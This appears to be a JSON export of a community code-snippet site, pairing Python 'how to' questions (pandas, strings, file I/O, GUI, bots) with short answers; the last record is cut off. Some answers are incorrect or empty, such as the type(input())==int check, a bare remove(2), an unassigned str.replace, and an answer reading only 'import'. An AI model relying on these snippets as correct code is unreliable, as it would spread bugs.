  {
    "id": 1886,
    "keyword": null,
    "link": null,
    "title": " how to redefine a legend in pandas",
    "description": "plt.legend(['New Name1', 'New Name2'])\n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
  {
    "id": 1887,
    "keyword": null,
    "link": null,
    "title": " how to reference a file in python",
    "description": "with open(\"filename.txt\",\"r\") as f:     contents = f.read()\n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1888,
    "keyword": null,
    "link": null,
    "title": " how to refresh windows 10 with python",
    "description": "import pyautogui as dp import time  dp.hotkey('win', 'd')  dp.position(x = 1920,y =540) ### You can change x and y based on the resolution of your pc dp.click(x = 1920,y =540,button = 'right')  dp.click(x = 1900,y =620)## These coordiantes are not universal, changes as per the pc resolution\n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1889,
    "keyword": null,
    "link": null,
    "title": " how to remove a string inside another string python",
    "description": " pythonCopylist_str = {'Abc.ex', 'Bcd.ex', 'cde.ex', 'def.jpg', 'efg.jpg'} new_set = {x.replace('.ex', '').replace('.jpg', '') for x in list_str} \n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1890,
    "keyword": null,
    "link": null,
    "title": " how to remove all 2 in a list python",
    "description": "x = [2, 1, 2] while 2 in x:   remove(2)\n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1891,
    "keyword": null,
    "link": null,
    "title": " how to remove all characters from a string in python",
    "description": "s = 'abc12321cba'  print(s.replace('a', '')) \nfor char in line:     if char in \" ?.!/;:\":         line.replace(char,'')\nsep = '...' stripped = text.split(sep, 1)[0]\n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1892,
    "keyword": null,
    "link": null,
    "title": " how to remove all spaces from a string in python",
    "description": "string = \"Hello, world! Some more text here...\" # Just a string string.replace(\" \", \"\") # Replaces all instances of \" \" (spaces)with \"\" (nothing)  # string is now \"Hello,World!Somemoretexthere...\" # I hope I helped you! ;)\n.replace(\" \", \"\")\nsentence = ' hello  apple' sentence.strip() >>> 'hello  apple'\nimport re s = '\\n \\t this is a string   with a lot of whitespace\\t' s = re.sub('\\s+', '', s)\nsentence = '       hello  apple         ' sentence.strip() >>> 'hello  apple'\n## Remove the Starting Spaces in Python   string1=\"    This is Test String to strip leading space\" print (string1.lstrip()) \n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1893,
    "keyword": null,
    "link": null,
    "title": " how to remove arrays in python from a specific place",
    "description": "array = [0, 1, 2, 3, 4]  array.pop(0) # Remove first array array.pop(1) # Remove second array array.pop(-1) # Remove last array\n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1894,
    "keyword": null,
    "link": null,
    "title": " how to remove b in front of python string",
    "description": "str_object = b'Python Pool' print(str_object)                   # => b'Python Pool' str_object = str_object.decode() print(str_object)                   # => Python Pool \n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1895,
    "keyword": null,
    "link": null,
    "title": " how to remove coma in python",
    "description": "s = s.replace(',', '')\n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1896,
    "keyword": null,
    "link": null,
    "title": " how to remove emoji from text in python",
    "description": "import re txt = 'He is so happy (smiley emoji)' # <-- grepper doesn't support emoji, so just assume it has def deEmojify(text):     regrex_pattern = re.compile(pattern = \"[\"         u\"\\U0001F600-\\U0001F64F\"  # emoticons         u\"\\U0001F300-\\U0001F5FF\"  # symbols & pictographs         u\"\\U0001F680-\\U0001F6FF\"  # transport & map symbols         u\"\\U0001F1E0-\\U0001F1FF\"  # flags (iOS)                            \"]+\", flags = re.UNICODE)     return regrex_pattern.sub(r'',text) print(deEmojify(txt))  # output 'He is so happy'  # full version of emoji cleaner def deEmojify(text):     \"function to remove emojis from text\"     regrex_pattern = re.compile(\"[\"         u\"\\U0001F600-\\U0001F64F\"  # emoticons         u\"\\U0001F300-\\U0001F5FF\"  # symbols & pictographs         u\"\\U0001F680-\\U0001F6FF\"  # transport & map symbols         u\"\\U0001F1E0-\\U0001F1FF\"  # flags (iOS)         u\"\\U00002500-\\U00002BEF\"  # chinese char         u\"\\U00002702-\\U000027B0\"         u\"\\U00002702-\\U000027B0\"         u\"\\U000024C2-\\U0001F251\"         u\"\\U0001f926-\\U0001f937\"         u\"\\U00010000-\\U0010ffff\"         u\"\\u2640-\\u2642\"          u\"\\u2600-\\u2B55\"         u\"\\u200d\"         u\"\\u23cf\"         u\"\\u23e9\"         u\"\\u231a\"         u\"\\ufe0f\"  # dingbats         u\"\\u3030\"                       \"]+\", re.UNICODE)     return regrex_pattern.sub(r'',text) print(deEmojify(txt))\n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1897,
    "keyword": null,
    "link": null,
    "title": " how to remove empty elements in a list python",
    "description": "def compact(lst):     return list(filter(None, lst))  compact([0, 1, False, 2, '', 3, 'a', 's', 34])     # [ 1, 2, 3, 'a', 's', 34 ]\nwithout_empty_strings = [string for string in a_list if string != \"\"]\nlist2 = filter(None, list1)\n",
    "reg_date": "2021-10-12T11:30:49.000Z"
  },
  {
    "id": 1898,
    "keyword": null,
    "link": null,
    "title": " how to remove first letter of a string",
    "description": "s = \"hello\" print s[1:]\n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1899,
    "keyword": null,
    "link": null,
    "title": " how to remove first letter of a string python",
    "description": "s = \"hello\" print s[1:]\ns = \":dfa:sif:e\" print(s[1:])  prints:   dfa:sif:e\n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1900,
    "keyword": null,
    "link": null,
    "title": " how to remove integer from string in python",
    "description": ">>> s = '12abcd405' >>> result = ''.join([i for i in s if not i.isdigit()]) >>> result 'abcd'\n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1901,
    "keyword": null,
    "link": null,
    "title": " how to remove microseconds from datetime in python",
    "description": ">>> datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\") '2011-11-03 18:21:26' \n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1902,
    "keyword": null,
    "link": null,
    "title": " how to remove plotly toolbar",
    "description": "dcc.Graph(     id='my-graph',     figure={'data': [{'x': [1, 2, 3]}]},     config={         'displayModeBar': False     } ) \n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1903,
    "keyword": null,
    "link": null,
    "title": " how to remove python3 on mac",
    "description": "MacBook-Pro:~ admin$ brew uninstall python3 Uninstalling /usr/local/Cellar/python/3.6.5... (5,102 files, 102.9MB) MacBook-Pro:~ admin$ python3 -bash: python3: command not found MacBook-Pro:~ admin$ python Python 2.7.10 (default, Oct  6 2017, 22:29:07)  [GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)] on darwin Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1904,
    "keyword": null,
    "link": null,
    "title": " how to remove text in brackets of python",
    "description": ">>> import re  >>> x = \"This is a sentence. (once a day) [twice a day]\" >>> re.sub(\"[\\(\\[].*?[\\)\\]]\", \"\", x) 'This is a sentence.  '\n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1905,
    "keyword": null,
    "link": null,
    "title": " how to remove trackback on python when ctrl c",
    "description": "import signal import sys signal.signal(signal.SIGINT, lambda x, y: sys.exit(0)) \n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1906,
    "keyword": null,
    "link": null,
    "title": " how to rename a column in pyspark dataframe",
    "description": "df.withColumnRenamed(\"dob\",\"DateOfBirth\")\n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1907,
    "keyword": null,
    "link": null,
    "title": " how to reomve certain row from dataframe pandas",
    "description": "# delete 10th, 11th, and 15th row of df, axis = 0 signify rows, inplace=True means changes directly going to apply to df. df.drop(labels=[10, 11, 15], axis=0, inplace=True) # or df = df.drop(labels=10, axis=0)\n",
    "reg_date": "2021-10-12T11:30:50.000Z"
  },
  {
    "id": 1908,
    "keyword": null,
    "link": null,
    "title": " how to replace a word in csv file using python",
    "description": "import csv  inputfile = csv.reader(open('civil-war-battles.csv','r')) outputfile = open('placelist.txt','w')  i=0  for row in inputfile:     place = row[2].replace(' ,',',')     print place     outputfile.write(place+'\\n')     i+=1\n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1909,
    "keyword": null,
    "link": null,
    "title": " how to replace na values in python",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].fillna(0) \n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1910,
    "keyword": null,
    "link": null,
    "title": " how to replace nan with 0 in pandas",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].fillna(0) \ndf['product']=df['product'].fillna(0) df['context']=df['context'].fillna(0) df\ndata[\"Gender\"].fillna(\"No Gender\", inplace = True) \npandas.DataFrame.fillna(0)\ndf.fillna('', inplace=True)\ndf.fillna(0)\n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1911,
    "keyword": null,
    "link": null,
    "title": " how to replace null values in pandas",
    "description": "df.column.fillna(0,inplace=True)\ndf['DataFrame Column'] = df['DataFrame Column'].fillna(0) \n#Python #Col 1 = where you want the values replaced #Col 2 = where you want to take the values from df[\"Col 1\"].fillna(df[\"Col 2\"], inplace=True) \n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1912,
    "keyword": null,
    "link": null,
    "title": " how to reset a variable in python",
    "description": "f = 11 print(f) del f print(f) # This should show a error thing that says that this variable doesn't exist\n# Basic syntax: del variable  # Example usage: variable = 42 print(variable) --> 42 del variable print(variable) --> NameError: name 'variable' is not defined # Note, this error is what we expect now that the variable has been # \tdeleted\n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1913,
    "keyword": null,
    "link": null,
    "title": " how to return PIL image from opencv",
    "description": "import cv2 import numpy as np from PIL import Image  img = cv2.imread(\"path/to/img.png\")  # You may need to convert the color. img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB) im_pil = Image.fromarray(img)  # For reversing the operation: im_np = np.asarray(im_pil)\n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1914,
    "keyword": null,
    "link": null,
    "title": " how to return the derivative of a function in python",
    "description": "#This prints the derivative of a function import sympy as sym x = sym.Symbol('x') function = x ** 4 + 7 * x ** 3 + 8 derivitive = sym.diff(function) print(derivitive)\nfrom sympy import Symbol, Derivative  x= Symbol('x')  function= x**4 + 7*x**3 + 8  deriv= Derivative(function, x) deriv.doit().subs({x:4})  \n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1915,
    "keyword": null,
    "link": null,
    "title": " how to reverse word order in python",
    "description": "## initializing the string string = \"I am a python programmer\" ## splitting the string on space words = string.split() ## reversing the words using reversed() function words = list(reversed(words)) ## joining the words and printing print(\" \".join(words))\n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1916,
    "keyword": null,
    "link": null,
    "title": " how to rewrite minute in datetime python",
    "description": "from datetime import datetime date = datetime.strptime('26 Sep 2012', '%d %b %Y') newdate = date.replace(hour=11, minute=59) \n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1917,
    "keyword": null,
    "link": null,
    "title": " how to rezize image in python tkinter",
    "description": "from tkinter import * from PIL import ImageTk, Image root=Tk()  image = Image.open('path_to_your_image.png') # The (450, 350) is (height, width) image = image.resize((450, 350), Image.ANTIALIAS) my_img = ImageTk.PhotoImage(image) my_img = Label(image = my_img) my_img.pack()  root.mainloop()\n",
    "reg_date": "2021-10-12T11:30:51.000Z"
  },
  {
    "id": 1918,
    "keyword": null,
    "link": null,
    "title": " how to right click in pyautogui",
    "description": ">>> pyautogui.click(button='right')  # right-click the mouse \n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1919,
    "keyword": null,
    "link": null,
    "title": " how to rotate image through mouse in pygame",
    "description": "# if you want to find the angle the mouse position is from the center #heres the formula angle = 360 - math.atan2(pos[1] - 300, pos[0] - 400) * 180 / math.pi\nimport pygame import pygame.font  pygame.init() size = (400,400) screen = pygame.display.set_mode(size) clock = pygame.time.Clock()  def blitRotate(surf, image, pos, originPos, angle):      # calcaulate the axis aligned bounding box of the rotated image     w, h       = image.get_size()     box        = [pygame.math.Vector2(p) for p in [(0, 0), (w, 0), (w, -h), (0, -h)]]     box_rotate = [p.rotate(angle) for p in box]     min_box    = (min(box_rotate, key=lambda p: p[0])[0], min(box_rotate, key=lambda p: p[1])[1])     max_box    = (max(box_rotate, key=lambda p: p[0])[0], max(box_rotate, key=lambda p: p[1])[1])      # calculate the translation of the pivot      pivot        = pygame.math.Vector2(originPos[0], -originPos[1])     pivot_rotate = pivot.rotate(angle)     pivot_move   = pivot_rotate - pivot      # calculate the upper left origin of the rotated image     origin = (pos[0] - originPos[0] + min_box[0] - pivot_move[0], pos[1] - originPos[1] - max_box[1] + pivot_move[1])      # get a rotated image     rotated_image = pygame.transform.rotate(image, angle)      # rotate and blit the image     surf.blit(rotated_image, origin)      # draw rectangle around the image     pygame.draw.rect (surf, (255, 0, 0), (*origin, *rotated_image.get_size()),2)  font = pygame.font.SysFont('Times New Roman', 50) text = font.render('image', False, (255, 255, 0)) image = pygame.Surface((text.get_width()+1, text.get_height()+1)) pygame.draw.rect(image, (0, 0, 255), (1, 1, *text.get_size())) image.blit(text, (1, 1)) w, h = image.get_size()  angle = 0 done = False while not done:     clock.tick(60)     for event in pygame.event.get():         if event.type == pygame.QUIT:             done = True         elif event.type == pygame.KEYDOWN:             if event.key==pygame.K_ESCAPE:                 done = True      pos = (screen.get_width()//2, screen.get_height()//2)     pos = (200, 200)      screen.fill(0)     blitRotate(screen, image, pos, (w//2, h//2), angle)     angle += 1      pygame.draw.line(screen, (0, 255, 0), (pos[0]-20, pos[1]), (pos[0]+20, pos[1]), 3)     pygame.draw.line(screen, (0, 255, 0), (pos[0], pos[1]-20), (pos[0], pos[1]+20), 3)     pygame.draw.circle(screen, (0, 255, 0), pos, 7, 0)      pygame.display.flip()  pygame.quit() \n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1920,
    "keyword": null,
    "link": null,
    "title": " how to round the values in a list",
    "description": "a_list = [1.234, 2.345, 3.45, 1.45] round_to_whole = [round(num) for num in a_list]  print(round_to_whole)\n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1921,
    "keyword": null,
    "link": null,
    "title": " how to run a function in interval in python",
    "description": "# this makes program sleep in intervals from time import time, sleep while True:     sleep(1 - time() % 1) # run every 1 second... you can change that \t# thing to run\n# This runs test() function in intervals of 1 second from threading import Timer run = True def test(): \tglobal run \tprint(\"something\") \tif run: \t\tTimer(1, test).start()  test() # now whenever you set run to False the test function won't run anymore # and of course if you dont set it to False it will run forever\n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1922,
    "keyword": null,
    "link": null,
    "title": " how to run commands in repl.ot",
    "description": "# Just run the command in the terminal. Or, you could create a .replit file and add this to it:  language=\"python\" run=\"python program.py --arg1 --arg2 --arg3\"\n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1923,
    "keyword": null,
    "link": null,
    "title": " how to run our discord bot with control panel",
    "description": "import\n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1924,
    "keyword": null,
    "link": null,
    "title": " how to run python script as admin",
    "description": "import ctypes, sys def is_admin():     try:         return ctypes.windll.shell32.IsUserAnAdmin()     except:         return False if is_admin():     # Code of your program here else:     # Re-run the program with admin rights     ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)  \nimport ctypes, os   def isAdmin(): \t\"\"\" Return True/Flase \"\"\"     try:         is_admin = (os.getuid() == 0)\t# if Unis     except AttributeError:         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0\t# elese if Windows     return is_admin\n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1925,
    "keyword": null,
    "link": null,
    "title": " how to run ur code in python idle",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1926,
    "keyword": null,
    "link": null,
    "title": " how to save a dictionary to excel in python",
    "description": "import pandas as pd  dict1 = {\"number of storage arrays\": 45, \"number of ports\":2390}  df = pd.DataFrame(data=dict1, index=[0])  df = (df.T)  print (df)  df.to_excel('dict1.xlsx')\n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1927,
    "keyword": null,
    "link": null,
    "title": " how to save a model and reuse fast ai",
    "description": "#export learn.export('/path/filename') #import learn = load_learner('/path/filename')\n",
    "reg_date": "2021-10-12T11:30:52.000Z"
  },
  {
    "id": 1928,
    "keyword": null,
    "link": null,
    "title": " how to save a model fast ai",
    "description": "#export learn.export('/path/filename') #import learn = load_learner('/path/filename')\n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1929,
    "keyword": null,
    "link": null,
    "title": " how to save a png seaborn pandas",
    "description": "sns.distplot(df['mpg']) plt.savefig('saving-a-high-resolution-seaborn-plot.png', dpi=300)\nswarm_plot = sns.swarmplot(...) fig = swarm_plot.get_figure() fig.savefig(...) \n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1930,
    "keyword": null,
    "link": null,
    "title": " how to save and load model in keras",
    "description": "# To save the model:  from keras.models import save_model  # you can write whatever you desire instead of 'my_model' # model = Your trained model model.save('my_model')  # To load the model:  from keras.models import load_model  reconstructed_model = load_model(\"my_model\")\nfrom tensorflow import keras model = keras.models.load_model('path/to/location')\njson_file = open('model.json', 'r') loaded_model_json = json_file.read() json_file.close() loaded_model = model_from_json(loaded_model_json) # load weights into new model loaded_model.load_weights(\"model.h5\")\n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1931,
    "keyword": null,
    "link": null,
    "title": " how to save array python",
    "description": "np.save('data.npy', num_arr) # save new_num_arr = np.load('data.npy') # load\nimport numpy as np  x = np.arange(10) # array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]) np.save(outfile, x)\n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1932,
    "keyword": null,
    "link": null,
    "title": " how to save image opencv",
    "description": "cv2.imwrite('data/dst/lena_opencv_red.jpg', im) \n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1933,
    "keyword": null,
    "link": null,
    "title": " how to save json file in python",
    "description": "with open('output.json', 'w') as outfile:     json.dump(data, outfile)\nwith open('data.txt', 'w') as outfile:     json.dump(data, outfile)\nimport json  data = {} data['people'] = [] data['people'].append({     'name': 'Scott',     'website': 'stackabuse.com',     'from': 'Nebraska' }) data['people'].append({     'name': 'Larry',     'website': 'google.com',     'from': 'Michigan' }) data['people'].append({     'name': 'Tim',     'website': 'apple.com',     'from': 'Alabama' })  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \nimport json  data = {}  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \nimport json  with open('data.txt') as json_file:     data = json.load(json_file)     for p in data['people']:         print('Name: ' + p['name'])         print('Website: ' + p['website'])         print('From: ' + p['from'])         print('') \n# to write on file # data_dict is a dictionary  import json          with open('data.json', 'w') as f: \tjson.dump(data_dict, f)\n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1934,
    "keyword": null,
    "link": null,
    "title": " how to save matplotlib figure to png",
    "description": "In [5]: plt.savefig('books_read.png') \n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1935,
    "keyword": null,
    "link": null,
    "title": " how to save plot in python",
    "description": "In [5]: plt.savefig('books_read.png')\nIn [5]: plt.savefig('books_read.png') \nplt.savefig('books_read.png')\n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1936,
    "keyword": null,
    "link": null,
    "title": " how to save python list to file",
    "description": "import json a = [1,2,3] with open('test.txt', 'w') as f:     f.write(json.dumps(a))  #Now read the file back into a Python list object with open('test.txt', 'r') as f:     a = json.loads(f.read())\nwith open('your_file.txt', 'w') as f:     for item in my_list:         f.write(\"%s\\n\" % item) \n# define list of places places = ['Berlin', 'Cape Town', 'Sydney', 'Moscow']  with open('listfile.txt', 'w') as filehandle:     for listitem in places:         filehandle.write('%s\\n' % listitem) \n",
    "reg_date": "2021-10-12T11:30:53.000Z"
  },
  {
    "id": 1937,
    "keyword": null,
    "link": null,
    "title": " how to save query data into dataframe pscopg2",
    "description": "import pandas as pd import pandas.io.sql as sqlio import psycopg2  conn = psycopg2.connect(\"host='{}' port={} dbname='{}' user={} password={}\".format(host, port, dbname, username, pwd)) sql = \"select count(*) from table;\" dat = sqlio.read_sql_query(sql, conn) conn = None\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1938,
    "keyword": null,
    "link": null,
    "title": " how to say hello with name in python",
    "description": "name = input(\"what is your name\")  print(\"Hello \"+name)\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1939,
    "keyword": null,
    "link": null,
    "title": " how to say hello world",
    "description": "python =    print (\"Hello World\") javascript = \tconsole.log(\"Hello World!\");  javascript =    Document.write(\"hello world\");\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1940,
    "keyword": null,
    "link": null,
    "title": " how to say someting in python",
    "description": "print(\"Insert Text Here\")\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1941,
    "keyword": null,
    "link": null,
    "title": " how to say that an input needs to be a number python",
    "description": "try:    val = int(userInput) except ValueError:    print(\"That's not an int!\")\nuser_input = input(\"Enter something:\")  if type(user_input) == int:     return user_input else:     print(\"Not a number\")\nuser_input = input(\"Enter something:\")  if type(user_input) == int:     print(\"Is a number\") else:     print(\"Not a number\")\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1942,
    "keyword": null,
    "link": null,
    "title": " how to scroll by  in selenium python",
    "description": "   for i in range(20): # adjust integer value for need        # you can change right side number for scroll convenience or destination         driver.execute_script(\"window.scrollBy(0, 250)\")        # you can change time integer to float or remove        time.sleep(1) \n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1943,
    "keyword": null,
    "link": null,
    "title": " how to search for a specific file extension with python",
    "description": "import glob, os os.chdir(\"/mydir\") for file in glob.glob(\"*.txt\"):     print(file)\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1944,
    "keyword": null,
    "link": null,
    "title": " how to search tuple values in a list in python",
    "description": "test = [(\"hi\", 1), (\"there\", 2)] test = dict(test) print test[\"hi\"] # prints 1\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1945,
    "keyword": null,
    "link": null,
    "title": " how to select a single cell in a pandas dataframe",
    "description": "# how to select a single cell in a pandas dataframe  import pandas as pd  old = pd.DataFrame({'A' : [4,5], 'B' : [10,20], 'C' : ['cell wanted',50], 'D' : [-30,-50]}) var = old['C'].values[0]  print(var)\nimport pandas as pd  data = [\"thing\"] df = pd.DataFrame(data)  print(df.values) print(df.values[0]) print(df.values[0][0]) #Get first element each time you want to remove the \"[]\" from a SINGLE value  >>>[['thing']] >>>['thing'] >>>'thing'\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1946,
    "keyword": null,
    "link": null,
    "title": " how to select all but last columns in python",
    "description": "df.iloc[:,:-1]\n",
    "reg_date": "2021-10-12T11:30:54.000Z"
  },
  {
    "id": 1947,
    "keyword": null,
    "link": null,
    "title": " how to send a message from google form to a python",
    "description": "import urllib.request from bs4 import BeautifulSoup import requests, warnings def get_questions(in_url):     res = urllib.request.urlopen(in_url)     soup = BeautifulSoup(res.read(), 'html.parser')     get_names = lambda f: [v for k,v in f.attrs.items() if 'label' in k]     get_name = lambda f: get_names(f)[0] if len(get_names(f))>0 else 'unknown'     all_questions = soup.form.findChildren(attrs={'name': lambda x: x and x.startswith('entry.')})     return {get_name(q): q['name'] for q in all_questions} def submit_response(form_url, cur_questions, verbose=False, **answers):     submit_url = form_url.replace('/viewform', '/formResponse')     form_data = {'draftResponse':[],                 'pageHistory':0}     for v in cur_questions.values():         form_data[v] = ''     for k, v in answers.items():         if k in cur_questions:             form_data[cur_questions[k]] = v         else:             warnings.warn('Unknown Question: {}'.format(k), RuntimeWarning)     if verbose:         print(form_data)     user_agent = {'Referer':form_url,                   'User-Agent': \"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36\"}     return requests.post(submit_url, data=form_data, headers=user_agent)\nimport urllib import urllib2  user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)' header={'User-Agent' : user_agent} url = \"http://....Your google form\" # values from your form. You will need to include any hidden variables if you want to.. values= { 'entry.asdfsdfsdasd': 'asdfasdfsd', 'draftResponse':'[,,\"-asdfasdasdf\"]', 'pageHistory':'0', 'fbzx':'-asdfasdfsd' } data = urllib.urlencode(values) urllib2.Request(url, data, header)\n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1948,
    "keyword": null,
    "link": null,
    "title": " how to send a message in a specific channel discord.py",
    "description": "channel = client.get_channel(12324234183172) await channel.send('hello') \n\"\"\"SEND MESSAGE IN SPECIFIC CHANNEL\"\"\" @client.command() async def announce(ctx, channel: discord.TextChannel): \t\tawait channel.send(\"My text\")\nchannel = client.get_channel(12324234183172) #channel id here await channel.send('hello') \n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1949,
    "keyword": null,
    "link": null,
    "title": " how to send get request python",
    "description": "import requests requests.get(\"https://www.google.com/\")\nimport socket  target_host = \"www.google.com\"  target_port = 80  # create a socket object  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # connect the client  client.connect((target_host,target_port))    # receive some data  response = client.recv(4096) print(f'Source Code: {response}') http_response = repr(response)\n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1950,
    "keyword": null,
    "link": null,
    "title": " how to send json in django response",
    "description": "from django.http import JsonResponse  def someviewfunction(request):   ...   return JsonResponse({'foo':'bar'})\n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1951,
    "keyword": null,
    "link": null,
    "title": " how to send whatsapp message with python",
    "description": "pip install pywhatkit import pywhatkit pywhatkit.sendwhatmsg('+91 9807685671', 'SENDING MESSAGES USING PYWHATKIT', 6,06) \n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1952,
    "keyword": null,
    "link": null,
    "title": " how to separate a string or int with comma in python",
    "description": " string = input('Input')     >>> 1,2     print(cord.split(','))     >>>['1', '2']\n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1953,
    "keyword": null,
    "link": null,
    "title": " how to set axis range matplotlib",
    "description": "# For a given y=time-dependent variable, x=time fig, ax = plt.subplots(figsize=(12, 6))  ax.plot(y, label='y') #'lower' is lower limit of the range you wanna set #'upper' is upper limit of the range you wanna set plt.xlim(lower, upper)  \n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1954,
    "keyword": null,
    "link": null,
    "title": " how to set bgcolor of a widget in pyqt5",
    "description": "self.setStyleSheet(\"background:red\")  # any color can be used in place of red\n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1955,
    "keyword": null,
    "link": null,
    "title": " how to set chrome options python selenium for a folder",
    "description": "chromeOptions = webdriver.ChromeOptions() prefs = {\"download.default_directory\" : \"/some/path\"} chromeOptions.add_experimental_option(\"prefs\",prefs) chromedriver = \"path/to/chromedriver.exe\" driver = webdriver.Chrome(executable_path=chromedriver, chrome_options=chromeOptions)\n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1956,
    "keyword": null,
    "link": null,
    "title": " how to set default python version in macos",
    "description": "ln -s -f /usr/local/bin/python3.7 /usr/local/bin/python \n$ brew update && brew upgrade python \n$ brew install pyenv \n",
    "reg_date": "2021-10-12T11:30:55.000Z"
  },
  {
    "id": 1957,
    "keyword": null,
    "link": null,
    "title": " how to set google chrome as default browser when coding with python using webbroiwser module",
    "description": "import webbrowser chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s' webbrowser.get(chrome_path).open('http://docs.python.org/')\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1958,
    "keyword": null,
    "link": null,
    "title": " how to set gui position tkinter python",
    "description": "import tkinter as tk #We'll use tkinter  class main: #This will be the main class   def __init__(self,master):     master.title('Simple Interface') #This is the title of the window     master.geometry('1200x700+0+0') #You can utilize +300+300 for example     \t\t\t\t\t\t\t\t#So now you can change the position of       \t\t\t\t\t\t\t\t#Your window  if __name__=='__main__':   master = tk.Tk() #Master is the name of our window   main = main(master)   master.mainloop #We're creating the loop\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1959,
    "keyword": null,
    "link": null,
    "title": " how to set index pandas",
